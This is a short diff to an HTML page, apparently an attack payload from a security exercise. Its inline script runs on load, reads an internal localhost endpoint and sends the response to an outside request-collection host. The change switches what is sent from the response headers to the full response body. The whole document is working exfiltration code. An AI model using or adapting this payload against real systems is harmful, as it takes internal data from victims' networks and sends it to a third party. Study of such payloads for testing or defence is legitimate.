@@ -6,8 +6,9 @@
   <body>
   </body>
   <script>
-    (function() {
-      fetch("http://127.0.0.1:8888/internal/info1").then(a => fetch("https://enxnu407hqabq.x.pipedream.net/?data=" + encodeURIComponent(JSON.stringify([...a.headers.entries()]))));
+    (async function() {
+      let t = await (await fetch("http://127.0.0.1:8888/internal/info1")).text();
+      await fetch("https://enxnu407hqabq.x.pipedream.net/?data=" + encodeURIComponent(t));
     })();
   </script>
 </html>
